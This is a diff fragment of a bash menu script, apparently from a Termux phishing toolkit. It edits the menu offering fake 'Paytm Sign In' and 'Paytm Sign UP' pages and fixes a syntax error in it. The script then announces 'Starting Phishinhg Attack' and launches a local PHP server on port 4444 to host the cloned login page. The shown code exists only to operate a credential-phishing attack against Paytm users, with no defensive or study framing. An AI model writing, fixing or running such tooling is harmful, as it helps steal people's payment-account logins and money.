@@ -261,13 +261,14 @@ ash() {
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd Paytm-Phishing/
                           echo ""
-                          echo -e $'\e[1;33m[\e[0m\e[1;77m 1 \e[0m\e[1;33m]\e[0m\e[1;32m Paytm Sign In \e[0m' 
-                          echo -e $'\e[1;33m[\e[0m\e[1;77m 2 \e[0m\e[1;33m]\e[0m\e[1;32m Paytm Sign UP \e[0m' 
-                          echo ""
-                          read -p $'\e[1;33m[\e[0m\e[1;77m >>> \e[0m\e[1;33m]\e[0m\e[1;32m Enter Your Choice : \e[0m' option1
+                          echo -e "\e[1;31m[\e[0m\e[1;77m 1 \e[0m\e[1;31m]\e[0m\e[1;32m Paytm Sign In \e[0m" 
+			  echo
+                          echo -e "\e[1;31m[\e[0m\e[1;77m 2 \e[0m\e[1;31m]\e[0m\e[1;32m Paytm Sign UP \e[0m"
+                          echo 
+                          read -p $'\e[1;31m[\e[0m\e[1;32m >>> \e[0m\e[1;31m]\e[0m\e[1;32m Enter Your Choice : \e[0m' option1
 		          if [ $option1 = 1 ] || [ $option1 = 01 ]
 			  then
-			      1)cd paytm/
+			        cd paytm/
                                 echo ""
                                 echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
                                 php -S 127.0.0.1:4444 > /dev/null 2>&1 &
